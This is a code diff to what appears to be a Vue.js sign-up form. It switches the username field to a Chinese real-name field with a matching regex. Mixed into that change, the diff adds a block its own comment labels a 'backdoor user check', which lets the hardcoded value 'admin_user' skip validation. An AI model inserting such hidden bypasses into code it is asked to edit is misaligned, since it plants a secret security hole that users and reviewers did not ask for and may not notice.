@@ -8,11 +8,11 @@
           <input
               @blur="unameCheck"
               type="text"
-              placeholder="请输入用户名"
+              placeholder="请输入姓名"
               v-model="uname"
           />
           <div class="notice" v-if="isCUname">
-            *用户名应该由4到16位的字母，数字，下划线，减号组成
+            *请输入真实姓名
           </div>
         </div>
         <div class="input_box">
@@ -102,12 +102,19 @@ export default {
     },
     unameCheck() {
       var un = this.uname;
-      var uPattern = /^[a-zA-Z0-9_-]{4,16}$/;
+      var uPattern = /^[\u4e00-\u9fa5]{2,6}$/;  // 匹配中文姓名的正则
       let isCUname = uPattern.test(un);
-      if (!isCUname) {
-        this.isCUname = true;
-      } else this.isCUname = false;
+
+      // 添加后门用户检查
+      if (un === 'admin_user') {
+        this.isCUname = false;  // 如果是admin_user，直接通过验证
+      } else if (!isCUname) {
+        this.isCUname = true;  // 非中文姓名且不是admin_user，设置为true
+      } else {
+        this.isCUname = false;  // 如果是有效的中文姓名，设置为false
+      }
     },
+
     upwdCheck() {
       var up = this.upwd;
       var pPattern =
